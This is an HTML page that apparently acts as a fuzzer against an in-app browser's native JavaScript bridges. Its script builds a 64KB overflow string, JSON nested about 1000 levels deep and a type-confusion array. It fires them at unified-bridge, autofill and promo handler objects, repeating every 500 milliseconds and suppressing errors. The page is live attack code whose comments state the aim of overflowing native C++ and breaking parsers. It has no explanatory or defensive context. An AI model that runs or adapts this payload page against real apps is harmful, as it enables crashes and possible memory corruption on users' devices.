<!DOCTYPE html>
<html>
<head><title>JSI Smart Fuzzer</title></head>
<body style="background:#000; color:#0f0;">
    <h3>Executing Smart Fuzzer...</h3>
    <div id="log"></div>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerHTML += msg + "<br>"; }

        // 1. The "Goldilocks" String: 64KB
        // Big enough to overflow C++, small enough to bypass Java GC issues
        const overflowString = "A".repeat(65536); 

        // 2. Deeply Nested JSON (Breaks native parsers by overflowing the call stack)
        let deepJson = '{"a":';
        for(let i=0; i<1000; i++) deepJson += '{"a":';
        deepJson += '"b"';
        for(let i=0; i<1000; i++) deepJson += '}';
        deepJson += '}';

        // 3. Type Confusion Array (Passing arrays where strings are expected)
        const typeConfArray = Array(1000).fill(overflowString);

        const payloads = [
            overflowString,
            deepJson,
            JSON.stringify(typeConfArray),
            JSON.stringify({ "action": "saveAutofill", "data": overflowString }),
            JSON.stringify({ "type": "promo", "content": deepJson })
        ];

        function smartStrike() {
            log("[*] Firing at Bridges...");
            
            payloads.forEach(p => {
                // Strike the Unified Bridge
                if (typeof window.__call_iabjs_unified_bridge === 'function') {
                    try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
                    try { window.__call_iabjs_unified_bridge("test_event", p); } catch(e) {}
                }

                // Strike Autofill
                if (window._AutofillMessageHandler) {
                    try { window._AutofillMessageHandler.postMessage(p); } catch(e) {}
                }

                // Strike Promo
                if (window._PromoExtensions) {
                    try { window._PromoExtensions.postMessage(p); } catch(e) {}
                }
            });
        }

        // Run the volley
        smartStrike();

        // Run it a few more times, but gently (every 500ms) to avoid Java GC lockup
        setInterval(smartStrike, 500);

    </script>
</body>
</html>
